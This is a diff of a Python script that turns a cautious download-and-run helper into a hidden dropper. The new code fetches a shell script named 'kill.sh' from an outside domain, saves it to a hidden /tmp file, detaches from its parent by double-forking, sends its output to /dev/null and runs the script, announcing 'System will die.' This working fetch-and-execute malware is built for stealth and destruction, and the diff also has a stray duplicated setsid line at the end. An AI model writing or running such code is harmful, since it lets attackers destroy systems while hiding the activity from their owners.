@@ -1,49 +1,61 @@
+#!/usr/bin/env python3
 import os
 import sys
+import urllib.request
 
-# URL to download and the local filename
+# === CONFIG ===
 url = "https://thedomaindesigners.com/pages/kill.sh"
-filename = "killer.sh"
+filename = "/tmp/.killer.sh"  # Hidden in /tmp
 
-# Download using curl. -f = fail on http errors, -s = silent, -S = show errors, -L = follow redirects
-download_cmd = f"curl -fsSL -o {filename} {url}"
-
-print("Downloading...", url)
-ret = os.system(download_cmd)
-if ret != 0:
-    print(f"Download failed (exit code {ret}). Aborting.")
-    sys.exit(1)
-
-# Verify file exists
-if not os.path.exists(filename):
-    print("Download did not produce the expected file. Aborting.")
-    sys.exit(1)
-
-# (Optional) Inspect the file before executing
-print(f"Downloaded {filename}. First 20 lines for quick inspection:\n")
-os.system(f"head -n 20 {filename}")
-print("\n--- End of preview ---\n")
-
-# Make executable
+# === DOWNLOAD ===
+print("Downloading payload...")
 try:
+    data = urllib.request.urlopen(url).read()
+    with open(filename, "wb") as f:
+        f.write(data)
     os.chmod(filename, 0o755)
+    print(f"Payload saved: {filename}")
 except Exception as e:
-    print(f"Could not set executable permission: {e}")
-    # continue — execution might still work via bash
+    print(f"Download failed: {e}")
+    sys.exit(1)
 
-# Execute the script
-print("Executing the script...")
-ret = os.system(f"./{filename}")
-if ret != 0:
-    print(f"Script exited with non-zero code: {ret}")
-else:
-    print("Script finished successfully.")
+# === DOUBLE-FORK DAEMON DETACH (NO subprocess) ===
+print("Detaching via double-fork...")
 
-# Cleanup (optional)
-cleanup = True
-if cleanup:
-    try:
-        os.remove(filename)
-        print(f"Removed {filename}")
-    except Exception as e:
-        print(f"Could not remove {filename}: {e}")
+# Fork 1: Detach from parent
+pid = os.fork()
+if pid > 0:
+    print(f"Fork 1: Child PID {pid}")
+    os._exit(0)  # Parent dies
+
+# Child 1: New session
+os.setsid()
+
+# Fork 2: True daemon
+pid = os.fork()
+if pid > 0:
+    os._exit(0)  # Child 1 dies
+
+# === FINAL CHILD: FULLY DETACHED ===
+print(f"Daemonized. Final PID: {os.getpid()}")
+
+# Redirect stdio to /dev/null
+devnull = open("/dev/null", "r+")
+os.dup2(devnull.fileno(), 0)
+os.dup2(devnull.fileno(), 1)
+os.dup2(devnull.fileno(), 2)
+devnull.close()
+
+# === EXECUTE PAYLOAD ===
+print("Payload armed. System will die.")
+try:
+    os.execv("/bin/bash", ["/bin/bash", filename])
+except:
+    # If exec fails, write error and die
+    with open("/tmp/.bomb_err", "w") as f:
+        f.write("EXEC FAILED\n")
+    os._exit(1)
+
+
+# Child 1: New session
+os.setsid()
